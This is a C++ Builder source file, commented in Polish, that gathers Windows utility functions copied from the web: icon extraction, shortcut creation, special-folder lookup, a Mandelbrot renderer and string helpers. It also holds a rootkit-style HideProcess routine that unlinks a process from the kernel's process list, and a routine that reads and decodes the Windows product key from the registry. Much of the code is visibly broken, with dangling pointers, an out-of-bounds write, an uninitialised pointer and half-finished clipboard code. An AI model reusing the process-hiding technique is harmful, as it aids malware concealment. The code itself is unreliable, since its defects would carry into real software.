//
//	Funkcje skopiowanie z internetu (mog¹ zawieraæ modyfikacje)
//
//---------------------------------------------------------------------------

#pragma hdrstop

#include "from_internet.h"
#include "Func.h"
//---------------------------------------------------------------------------


void SaveIcons() {

	if (!ExistsDir(ExtractFilePath(Application->ExeName) + "Ikony"))   			// jeœli nie istneje
			CreateDir(ExtractFilePath(Application->ExeName) + "Ikony");

	unique_ptr<TOpenDialog>OpenDialog1(new TOpenDialog(0));

//	int X = 20, Y = 20;
	if (OpenDialog1->Execute()) {
		String IFile = OpenDialog1->FileName;
		for (int i = 0; i < 100000; i++) { // maksymalna iloœ ikon
			try {
				unique_ptr<TImage>Ikona(new TImage(0));
				Ikona->Width = 256;
				Ikona->Height = 256;

				Ikona->Picture->Icon->Handle =
					ExtractIcon((HINSTANCE__*)Application->Handle,
					IFile.c_str(), i);
				if (Ikona->Picture->Icon->Empty) break;
				Ikona->Picture->Icon->SaveToFile
					(ExtractFilePath(Application->ExeName) + "Ikony\\" +
					Getname(OpenDialog1->FileName,1) + IntToStr(i) + ".ico");
			}
			catch (...) {LogSave("B³¹d funkcji SaveIcons");}
		}
	}
	if ((*OpenDialog1).FileName == "")
		ShowMessage("Nie mogê wyodrêbniæ ikon nie wybrano pliku");
	else
		ShellExecuteA(0, "open", ".\\Ikony", "", "", 5);

		/*                                    SHGetFileInfo() + kompresja
		  BIN_16x16 = 'BIN_16x16';
  BIN_32x32 = 'BIN_32x32';
  BIN_48x48 = 'BIN_48x48';
var
  hDLL: hWnd;
  rsIcon: TResourceStream;
begin
  hDLL := LoadLibrary('LibraryName.dll');

  if hDLL <> 0 then
  try
	{ dla rozmiaru 16x16 pikseli }
    rsIcon := TResourceStream.Create(hDLL, BIN_16x16, 'RT_ICON');
    { dla rozmiaru 32x32 pikseli }
    rsIcon := TResourceStream.Create(hDLL, BIN_32x32, 'RT_ICON');
	{ dla rozmiaru 48x48 pikseli }
    rsIcon := TResourceStream.Create(hDLL, BIN_48x48, 'RT_ICON');

    { wykorzystanie strumienia z za³adowan¹ ikon¹ }

    rsIcon.Free();
  except
    on Exception do
	  MessageBox('Loading icon from DLL failed!', 'Load Icon', MB_ICONSTOP);
  end;

  FreeLibrary(hDLL);
		*/

}

// ---------------------------------------------------------------------------

bool __fastcall CreateShortcutLink(AnsiString LinkDesc,
			AnsiString LinkPath, AnsiString TargetPath, AnsiString TargetArgs) 	//funkcja tworz¹ca skróty.
{
 CoInitialize(NULL);

 bool retval = false;
 HRESULT hres = 0;
 IShellLink* psl = NULL;
 SetLastError(0);

 LPCLASSFACTORY pcf = NULL;
 hres = CoGetClassObject(CLSID_ShellLink,
                         CLSCTX_INPROC_SERVER,
						 NULL,
                         IID_IClassFactory,
                         (LPVOID*)&pcf);

 if(SUCCEEDED(hres))
 {
  hres = pcf->CreateInstance(NULL,
                             IID_IShellLink,
                             (LPVOID*)&psl);
							 pcf->Release();
 }
 if(SUCCEEDED(hres))
 {
  IPersistFile* ppf = NULL;
	// Ustawianie œcie¿ki, katalogu roboczego i opisu skrótu
  psl->SetPath( ((String)TargetPath).c_str());
  psl->SetArguments( ((String)TargetArgs).c_str());
  psl->SetDescription( ((String)LinkDesc).c_str());
  psl->SetWorkingDirectory( ExtractFilePath(TargetPath).c_str());
  hres = psl->QueryInterface(IID_IPersistFile, &(void*)ppf);

  if(SUCCEEDED(hres))
  {
   wchar_t wsz[MAX_PATH];
   MultiByteToWideChar(CP_ACP, 0, LinkPath.c_str(), -1, wsz, MAX_PATH);
   hres = ppf->Save(wsz, TRUE);
   ppf->Release();
  }
  psl->Release();
  retval = SUCCEEDED(hres);
 }

 switch(hres)
 {
  case S_OK:     /*            ShowMessage("Utworzono skrót.");         */              break;
  case REGDB_E_CLASSNOTREG:   ShowMessage("Niezarejestrowana klasa."); break;
  case E_OUTOFMEMORY:         ShowMessage("Za ma³o miejsca w pamiêci.");             break;
  case E_INVALIDARG:          ShowMessage("Nieprawid³owy parametr.");                break;
  case E_UNEXPECTED:          ShowMessage("Nieoczekiwany b³¹d.");                    break;
  case CLASS_E_NOAGGREGATION: ShowMessage("Nie mo¿na utworzyæ klasy.");              break;
  case E_FAIL:                ShowMessage("Nie mo¿na utworzyæ skrótu.");             break;
  case E_NOTIMPL:             ShowMessage("Nieobs³ugiwany interfejs.");               break;
  default:                    ShowMessage("Nieznany b³¹d.");
 }
 CoUninitialize();
 return retval;
}

//---------------------------------------------------------------------------
 void DelToBin(String d) {

	SHFILEOPSTRUCT fos;
	fos.hwnd = Application->Handle;
	fos.wFunc = FO_DELETE;
	fos.pFrom = (ExtractFileDir(d).c_str());
	// nazwa kasowanego pliku, trzeba podaæ pe³n¹ œcie¿kê dostêpu
	fos.fFlags = FOF_ALLOWUNDO;
	SHFileOperation(&fos);
 }

//---------------------------------------------------------------------------

 AnsiString __fastcall GetSpecialFolder(int iFolder)
{
 char Path[MAX_PATH];
 ZeroMemory(Path, MAX_PATH);

 LPMALLOC lpMalloc;
 if(SUCCEEDED(SHGetMalloc(&lpMalloc)))
 {
  LPITEMIDLIST lpidl;
  if(SUCCEEDED(SHGetSpecialFolderLocation(Application->Handle,
					 iFolder, &lpidl)))
  {
	  SHGetPathFromIDListA(lpidl, Path);
	  lpMalloc->Free(lpidl);
  }
  lpMalloc->Release();
 }

 return AnsiString(Path);
}
/*
Sta³a	Opis	Wartoœæ	Wersja 1
CSIDL_ALTSTARTUP	programy uruchamiane wraz z systemem	29
CSIDL_APPDATA	Dane aplikacji	26	4.71
CSIDL_BITBUCKET	wirtualny folder Kosz	10	z rodziny NT
CSIDL_COMMON_ALTSTARTUP	wspólne programy u¿ytkowników uruchamiane wraz ze startem systemu	30	z rodziny NT
CSIDL_COMMON_DESKTOPDIRECTORY	folder plików widocznych na Pulpicie ka¿dego u¿ytkownika	25	z rodziny NT
CSIDL_COMMON_FAVORITES	wspólne Ulubione wszystkich u¿ytkowników	31	z rodziny NT
CSIDL_COMMON_PROGRAMS	wspólne Programy w Menu Start	23	z rodziny NT
CSIDL_COMMON_STARTMENU	elementy Menu Start dla wszystkich u¿ytkowników	22	z rodziny NT
CSIDL_COMMON_STARTUP	Autostart dla wszystkich u¿ytkowników	24
CSIDL_CONTROLS	wirtualny folder Panelu sterowania	3
CSIDL_COOKIES	Cookies stron internetowych	33
CSIDL_DESKTOP	wirtualny folder pulpitu	0
CSIDL_DESKTOPDIRECTORY	fizyczny folder Pulpit	16
CSIDL_DRIVES	wirtualny folder Mój komputer	17
CSIDL_FAVORITES	ulubione obiekty	6
CSIDL_FONTS	folder zawieraj¹cy zainstalowane czcionki	20
CSIDL_HISTORY	³¹czniki do ostatnio odwiedzonych stron	34
CSIDL_INTERNET	wirtualny folder reprezentuj¹cy Internet	1
CSIDL_INTERNET_CACHE	Temporary Internet Files	32	4.72
CSIDL_NETHOOD	elementy wyswietlane w Otoczeniu sieciowym	19
CSIDL_NETWORK	wirtualny folder Otoczenia sieciowego	18
CSIDL_PERSONAL	Moje dokumenty	5
CSIDL_PRINTERS	wirtualny folder zainstalowanych drukarek	4
CSIDL_PRINTHOOD	repozytorium dla ³¹czników do drukarek	27
CSIDL_PROFILE	folder profilu u¿ytkownika (zwykle jest to C:\Documents and Settings\u¿ytkownik)	40	5.0
CSIDL_PROFILES	folder zawieraj¹cy foldery profili u¿ytkowników	62	6.0
CSIDL_PROGRAM_FILES 2	folder programów, zwykle jest to C:\Program Files	38	5.0
CSIDL_PROGRAMS	Programy w Menu Start	2
CSIDL_RECENT	ostatnio u¿ywane dokumenty	8
CSIDL_SENDTO	opcje menu "Wyœlij do..."	9
CSIDL_STARTMENU	Menu Start	11
CSIDL_STARTUP	Autostart	7
CSIDL_SYSTEM 3	folder systemowy, zwykle jest to C:\Windows\System32	37	5.0
CSIDL_TEMPLATES	Szablony	21
CSIDL_WINDOWS 4	folder Windows
*/
// ---------------------------------------------------------------------------
void BringWindowToFront(HWND hWnd)
{
 bool Result;
 DWORD ForegroundWindowThreadID;
 DWORD WindowThreadID;
 if(hWnd != GetForegroundWindow())
 {
  ForegroundWindowThreadID = GetWindowThreadProcessId(GetForegroundWindow(), NULL);
  WindowThreadID = GetWindowThreadProcessId(hWnd, NULL);
  if(ForegroundWindowThreadID != WindowThreadID)
  {
   AttachThreadInput(ForegroundWindowThreadID, WindowThreadID, true);
   SetForegroundWindow(hWnd);
   AttachThreadInput(ForegroundWindowThreadID, WindowThreadID, false);
  }
  else
   SetForegroundWindow(hWnd);
  ShowWindow(hWnd, SW_RESTORE);
 }
}
// ---------------------------------------------------------------------------

// This gets called by winapi for every window on the desktop
BOOL CALLBACK EnumWindowsProc(HWND windowHandle, LPARAM lParam)  {
	DWORD searchedProcessId = (DWORD)lParam;  // This is the process ID we search for (passed from BringToForeground as lParam)
    DWORD windowProcessId = 0;
    GetWindowThreadProcessId(windowHandle, &windowProcessId); // Get process ID of the window we just found
    if (searchedProcessId == windowProcessId)  {  // Is it the process we care about?
      SetForegroundWindow(windowHandle);  // Set the found window to foreground
      return FALSE;  // Stop enumerating windows
    }
    return TRUE;  // Continue enumerating
}
// ---------------------------------------------------------------------------

void BringToForeground(DWORD processId)  {
   EnumWindows(&EnumWindowsProc, (LPARAM)processId);
}
// ---------------------------------------------------------------------------

void ExecuteApp(String sFileName)
{
	STARTUPINFO StartupInfo;
	ZeroMemory( &StartupInfo, sizeof(STARTUPINFO));
	StartupInfo.cb = sizeof(STARTUPINFO);

	PROCESS_INFORMATION ProcessInfo;

	if(CreateProcess(NULL,
		sFileName.c_str(), // tutaj nastêpuje uruchomienie proramu przekazanego funkcji:
		NULL,
		NULL,
		TRUE,
		NORMAL_PRIORITY_CLASS,
		NULL,
		NULL,
		&StartupInfo,
		&ProcessInfo))
    {
	CloseHandle(ProcessInfo.hProcess);
	CloseHandle(ProcessInfo.hThread);
	}
	else   ShowMessage("B³¹d tworzenia procesu z œcie¿ki: " + sFileName);
}
// ---------------------------------------------------------------------------
 bool ExistsDir(const String dirName_in) {

	unique_ptr<DWORD> ftyp(new DWORD( GetFileAttributesW( dirName_in.w_str()) ));
//  DWORD ftyp = GetFileAttributesW( dirName_in.w_str());
  if (*ftyp == INVALID_FILE_ATTRIBUTES)
    return false;  //something is wrong with your path!

  if (*ftyp & FILE_ATTRIBUTE_DIRECTORY)
    return true;   // this is a directory!

  return false;    // this is not a directory!
 }
// ---------------------------------------------------------------------------
AnsiString GetProductKey() // klucz instalacyjny
{
	String strResult;
	HKEY hRegistryKey;
	BYTE *DigitalProductID;
	DWORD DataLength;
	BYTE ProductKeyExtract[15];
	char sCDKey[256];
	long ByteCounter;
	long ByteConvert;
	int nCur;
	char *KeyChars[] = {
		"B", "C", "D", "F", "G", "H", "J", "K", "M", "P", "Q", "R", "T", "V",
		"W", "X", "Y", "2", "3", "4", "6", "7", "8", "9", NULL};

	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
		L"SOFTWARE\\MICROSOFT\\Windows NT\\CurrentVersion",
		REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS,
		&hRegistryKey) == ERROR_SUCCESS) {
		DataLength = 164;
		DigitalProductID = (BYTE*)malloc(DataLength);
		memset(DigitalProductID, 0, DataLength);
		if (RegQueryValueEx(hRegistryKey, L"DigitalProductId", NULL, NULL,
			DigitalProductID, &DataLength) == ERROR_SUCCESS) {
			for (ByteCounter = 52; ByteCounter <= 66; ByteCounter++) {
				ProductKeyExtract[ByteCounter - 52] =
					DigitalProductID[ByteCounter];
			}
			ProductKeyExtract[sizeof(ProductKeyExtract)] = NULL;
		}
	}

	memset(sCDKey, 0, sizeof(sCDKey));

	for (ByteCounter = 24; ByteCounter >= 0; ByteCounter--) {
		nCur = 0;
		for (ByteConvert = 14; ByteConvert >= 0; ByteConvert--) {
			nCur = (nCur * 256) ^ ProductKeyExtract[ByteConvert];
			ProductKeyExtract[ByteConvert] = nCur / 24;
			nCur = nCur % 24;
		}
		strrev(sCDKey);
		strcat(sCDKey, KeyChars[nCur]);
		strrev(sCDKey);

		if (!(ByteCounter % 5) && (ByteCounter)) {
			strrev(sCDKey);
			strcat(sCDKey, "-");
			strrev(sCDKey);
		}
	}

	RegCloseKey(hRegistryKey);
	if (DigitalProductID)
		delete DigitalProductID;

	return (AnsiString)sCDKey;
}

// ---------------------------------------------------------------------------

void ShowProperties(String FileName) // W³aœciwoœci pliku
{
	SHELLEXECUTEINFO ShExecInfo = {0};
	ShExecInfo.cbSize = sizeof(ShExecInfo);
	ShExecInfo.fMask = SEE_MASK_INVOKEIDLIST;
	ShExecInfo.hwnd = GetDesktopWindow();
	ShExecInfo.lpVerb = L"properties";
	ShExecInfo.lpFile = FileName.c_str();
	ShExecInfo.lpParameters = L"";
	ShExecInfo.lpDirectory = NULL;
	ShExecInfo.nShow = SW_SHOW;
	ShExecInfo.hInstApp = NULL;
	ShellExecuteEx(&ShExecInfo);
}

// ---------------------------------------------------------------------------
//	 Screen->Cursor = crHourGlass; // zmiana kursora na zajêty                   // zastosowanie
// DeleteDir("c:\\temp");
// Screen->Cursor = crDefault; /


void __fastcall DeleteDir(String Dir) {
 Dir = (Dir.SubString(Dir.Length(), 1) != "\\") ? Dir + "\\" : Dir;
 TSearchRec sr;

 if(FindFirst(Dir + "*.*", faAnyFile, sr) == 0)
 {
  do
  {
   if(((sr.Attr & faDirectory) > 0) & (sr.Name != ".") & (sr.Name != ".."))
   {
    DeleteDir(Dir + sr.Name + "\\"); // tutaj nastêpuje rekurencyjne wywo³anie funkcji
   }
   FileSetAttr(Dir + sr.Name, faArchive); // zmiana atrybutów plików i podkatalogów na archiwalny
   DeleteFile(Dir + sr.Name); // tutaj s¹ kasowane pliki w katalogu (podkatalogu)
   RemoveDir(Dir + sr.Name);  // tutaj jest kasowany podkatalog w zadanym katalogu
  }
  while(FindNext(sr) == 0);
  FindClose(sr);
 }
 RemoveDir(Dir); // na koniec kasowany jest zadany katalog
}
// ---------------------------------------------------------------------------

 void OnSetFilesToClipboard( String *Files)
{
	unique_ptr<char[]> File( new char[ (*Files).Length()]);

	char sFiles[] = "C:\\zrzut.bmp";

	      //	for (int i = 0; i < (*Files).Length(); i++) {
//
//	if ((*Files).Length() < i) break;
//		File.operator[](i) = (*Files)[i + 1];
//

	strcpy(	File.get(), (ToArrW(Files)));
	strcpy(	sFiles, (ToArrW(Files)));

//		File.operator[]((*Files).Length()) = '\\';
//		File.operator[]((*Files).Length()+1) = '0';

	DROPFILES dobj = {20, {0, 0}, 0, 1};
	int nLen = sizeof( &sFiles );
			ShowMessage(sizeof( &sFiles ));
			ShowMessage(sizeof( &Files ));
	int nGblLen = sizeof(dobj) + nLen * 2 + 5;
	// lots of nulls and multibyte_char
	HGLOBAL hGbl = GlobalAlloc(GMEM_ZEROINIT | GMEM_MOVEABLE | GMEM_DDESHARE, nGblLen);
	char* sData = (char*)::GlobalLock(hGbl);
	memcpy(sData, &dobj, 20);
	char* sWStr = sData + 20;
	for (int i = 0; i < nLen * 2; i += 2) {
		sWStr[i] = sFiles[i / 2];
	}
	::GlobalUnlock(hGbl);

	if (OpenClipboard(Application->Handle)) {
		EmptyClipboard();
		SetClipboardData(CF_HDROP, hGbl);
		CloseClipboard();
	}
	ShowMessage(WhatInClipboard());
}

// ---------------------------------------------------------------------------

/*
	 #define R_OK    4       // Test for read permission.
	 #define W_OK    2       // Test for write permission.
// 	 #define X_OK    1    	 // execute permission - unsupported in windows
	 #define F_OK    0       // Test for existence.
*/

 void EditValidPath(TEdit * Edit, int W_OK_2) {

	if (access( ToArrW( &(Edit->Text) ) , W_OK_2) != 0)	{                    	// jeœli nie spe³nia warunku access(read,exist)

		 Edit->Color = clBtnFace;                                              	// szary kolor

		 if ( Edit->CanFocus() )   Edit->SetFocus();

		 unique_ptr<String> str(new String(Edit->Text) );
		 unique_ptr<unsigned short int > pos(new unsigned short int( (*str).Length() ));

		 do {

			 (*str).Delete(*pos, 1);
			 (*pos)--;
			 if ( !*pos) break;                                                 // zabezpieczenie

		 }	 while ( access( ToArrW( &(*str) ) , W_OK_2) != 0 );                // usuwaj a¿ bêdzie poprawna œcie¿ka

		Edit->Perform(EM_SETSEL, *pos, Edit->Text.Length());

	 } else 	 Edit->Color = clWindow;                                        // kolor domyœlny (bia³y)
}
// ---------------------------------------------------------------------------

void Del( TEdit * Edit, WORD &Key, unsigned short *pos )
{

		if ( Key == vkBack )
		{
			if ( S::Del_only_one_sign )
			{
//				if (Key != vkBack && Key != 127 && Key != vkDelete)

				{

						;                                                      	// usuwanie po 1 znaku
						Edit->Perform(EM_SETSEL, *pos, *pos);
				}
//				else Edit->Perform(EM_SETSEL, Edit->Text.Length(), Edit->Text.Length());
			}
//		 else if ( Key != vkRight  && Key != vkLeft) Edit->Perform( EM_SETSEL, Edit->Text.Length(), Edit->Text.Length() );        // dziêki temu mo¿na pisaæ wiêcej znaków bo by³y nadpisywane
		} else if ( Key != vkRight  && Key != vkLeft) Edit->Perform( EM_SETSEL, *pos, *pos );        // dziêki temu mo¿na pisaæ wiêcej znaków bo by³y nadpisywane

}

void SetMode( TEdit * Edit, WORD &Key, unsigned short *pos )
{
	if ( Key == vkDelete )
		{
			S::Del_only_one_sign = !S::Del_only_one_sign;                       // Del - prze³¹cznik pomiêdzy trybami kasowania

			if ( S::Del_only_one_sign ) { Edit->BevelKind = bkNone; Edit->BorderStyle = bsSingle; } // wizualna obs³uga trybów
			else { Edit->BevelKind = bkSoft; Edit->BorderStyle = bsNone; }
		// - - - - - - - -
			if ( Edit->SelLength == 0)
				Edit->Perform(EM_SETSEL, Edit->Text.Length()-1, Edit->Text.Length() );  // zaznacza ostatni znak jeœli brak zaznaczeñ
			else
				Edit->Text = Edit->Text.Delete(*pos + 1, 1);

			Edit->Perform(EM_SETSEL, *pos, *pos);
		}
}



 void EditKeyDown( TEdit * Edit, WORD &Key ) {

	unique_ptr<unsigned short> pos(new unsigned short(Edit->SelStart + Edit->SelLength )); // koñcówka zaznaczenia
		static int e = Edit->SelStart;
		 if ( Key == vkLeft)
		e--;
	  if ( Key == vkRight)
		e++;

	  if ( Key == vkLeft)
		(*pos)--;
	  if ( Key == vkRight)
		(*pos)++;

	if ( Key != vkControl && Key != vkShift) 									// ctrl, shift
	{
		SetMode( Edit, Key, pos.get() );

		Del( Edit, Key, pos.get() );

	}
    if ( Key != vkRight  && Key != vkLeft)
		Edit->Perform(EM_SETSEL, e, e);
	else
		Edit->Perform(EM_SETSEL, *pos, *pos);
 }
// ---------------------------------------------------------------------------

void OpenFolderSelectFile(LPCTSTR filename)
{
    ITEMIDLIST *pidl = ILCreateFromPath(filename);
    if(pidl) {
		SHOpenFolderAndSelectItems(pidl,0,0,0);
        ILFree(pidl);
    }
}

// ---------------------------------------------------------------------------
String GetFileVersion(String path_to_file__exe_dll )
{
	DWORD  verHandle = NULL;
	UINT   size      = 0;
	LPBYTE lpBuffer  = NULL;
	DWORD  verSize   = GetFileVersionInfoSize(path_to_file__exe_dll.c_str(), &verHandle);
	VS_FIXEDFILEINFO    *pFileInfo = NULL;
	int major, minor, revision ,build = 0;

  if (verSize != NULL)
  {
		LPSTR verData = new char[verSize];

	if (GetFileVersionInfo( path_to_file__exe_dll.c_str(), verHandle, verSize, verData))
	{
		if (VerQueryValue(verData,L"\\",(VOID FAR* FAR*)&lpBuffer,&size))
		{
			if (size)
			{
				VS_FIXEDFILEINFO *verInfo = (VS_FIXEDFILEINFO *)lpBuffer;
				if (verInfo->dwSignature == 0xfeef04bd)
				{
				   major =     HIWORD(verInfo->dwProductVersionMS);
				   minor =     LOWORD(verInfo->dwProductVersionMS);
				   revision =  HIWORD(verInfo->dwProductVersionLS);
				   build =     LOWORD(verInfo->dwProductVersionLS);

					// Doesn't matter if you are on 32 bit or 64 bit,
					// DWORD is always 32 bits, so first two revision numbers
					// come from dwFileVersionMS, last two come from dwFileVersionLS
//					TRACE( "File Version: %d.%d.%d.%d\n",
//					( pFileInfo->dwFileVersionMS >> 16 ) & 0xffff,
//					( pFileInfo->dwFileVersionMS >>  0 ) & 0xffff,
//					( pFileInfo->dwFileVersionLS >> 16 ) & 0xffff,
//					( pFileInfo->dwFileVersionLS >>  0 ) & 0xffff
//                    );
				}
			}
		}
	}
	delete[] verData;
  }

	return String( (String)major + "." + minor + "." + revision + "." + build );
}

// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------

TColor kpFractal(double cX, double cY) {
	double x = 0, y = 0;
	byte n = 0;
	for (; n < 255; n++) {
		double xNext = x * x - y * y + cX;
		double yNext = 2 * x * y + cY;
		if (xNext * xNext + yNext * yNext > 4)
			break;
		else {
			x = xNext;
			y = yNext;
		}
	}
	TColor kolor;
	if (n == 255)
		kolor = clBlack;
	else
		kolor = TColor(255, 255 - n, n);

	return kolor;
}

// ---------------------------------------------------------------------------
void __fastcall Mandelbrot(TCanvas *Canvas, TObject *Temp) {
	int kMax = reinterpret_cast<TControl*>(Temp)->ClientWidth;
	int lMax = reinterpret_cast<TControl*>(Temp)->ClientHeight;

	double cXmin = 0.20, cYmin = 0.54;
	double cXmax = 0.22, cYmax = 0.55;
	for (int l = 0; l < lMax; l++) {
		for (int k = 0; k < kMax; k++) {
			double cX, cY;
			cX = cXmin + k * (cXmax - cXmin) / kMax;
			cY = cYmin + l * (cYmax - cYmin) / lMax;
			Canvas->Pixels[k][l] = kpFractal(cX, cY);
		}
	}
}
// ---------------------------------------------------------------------------
VOID HideProcess(char *processName, int size)
{
//  PEPROCESS toHide;
  PLIST_ENTRY listtoHide;

//  toHide = (PEPROCESS) SearchByName(processName, size);
//  if (toHide == 0)
//	return ;

 // We change the pointers reference
//  listtoHide = (PLIST_ENTRY)((PUCHAR) toHide + 0x088);
  *((PDWORD) listtoHide->Blink) = (DWORD) listtoHide->Flink;
  *((PDWORD) (listtoHide->Flink)+1) = (DWORD) listtoHide->Blink;
  listtoHide->Blink = (PLIST_ENTRY)&listtoHide->Flink;
  listtoHide->Flink = (PLIST_ENTRY)&listtoHide->Flink;
}
// ---------------------------------------------------------------------------

char* ToArrW( String *unicodeB ) {

	unique_ptr<char>  str(new char[(*unicodeB).Length()+1]);               		// MY implementation

	strcpy(str.get(), ( (AnsiString)*unicodeB).c_str());

	return str.get();
}

char* ToArrW( String unicodeB ) {

	unique_ptr<char>  str(new char[unicodeB.Length()+1]);               		// MY implementation

	strcpy(str.get(), ( (AnsiString)unicodeB).c_str());

	return str.get();
}

// ---------------------------------------------------------------------------

wchar_t* ToArrA( AnsiString *ansiB ) {

	// first convert to AnsiString instead of Unicode.
//	AnsiString ansiB(b);

	// allocate enough memory for your char array (and the null terminator)
//	char* str = new char[(*ansiB).Length()+1];                                  // OLD
	unique_ptr<wchar_t>  str(new wchar_t[(*ansiB).Length()+1]);                       // MY implementation

	// copy the contents of the AnsiString into your char array
	StrCpyW(str.get(), ( (String)*ansiB).c_str());

	// the rest of your code goes here
	return str.get();
	// remember to delete your char array when done
//	delete[] str;
}
// ---------------------------------------------------------------------------

 String ToStr(char* tab) {

 unique_ptr<unsigned int> i(new unsigned int(0));
 unique_ptr<String> str(new String(tab));

	return *str.get();
 }

// ---------------------------------------------------------------------------
// char* ToS(String Unic) {                                                       // nie bangla
//
//	unique_ptr<char>  str(new char[Unic.Length()+1]);               		// MY implementation
//
//	strcpy(str.get(), ( (AnsiString)Unic).c_str());
//
//	return str.get();
// }
// char[] ToArrW( String *unicodeB ) {
//
//	unique_ptr<char>  str(new char[(*unicodeB)]);               		// MY implementation
//
//	strcpy(str.get(), ( (AnsiString)*unicodeB).c_str());
//
//	return str.get();
//}

// ---------------------------------------------------------------------------



// ---------------------------------------------------------------------------



// ---------------------------------------------------------------------------



// ---------------------------------------------------------------------------



// ---------------------------------------------------------------------------




// ---------------------------------------------------------------------------

#pragma package(smart_init)
